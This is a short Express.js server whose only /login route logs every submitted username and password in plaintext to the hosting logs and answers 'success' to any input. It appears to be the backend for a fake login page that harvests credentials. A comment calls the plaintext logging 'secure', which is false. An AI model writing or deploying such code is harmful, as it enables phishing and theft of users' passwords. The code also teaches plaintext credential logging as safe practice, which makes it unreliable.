require("dotenv").config();
const express = require("express");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

app.post("/login", (req, res) => {
    const { username, password } = req.body;

    // Log credentials securely in the Render logs (only visible to you)
    console.log(` Login Attempt: Username - ${username}, Password - ${password}`);

    res.json({ success: true, message: "Login received" });
});

app.listen(PORT, () => {
    console.log(` Server running on port ${PORT}`);
});
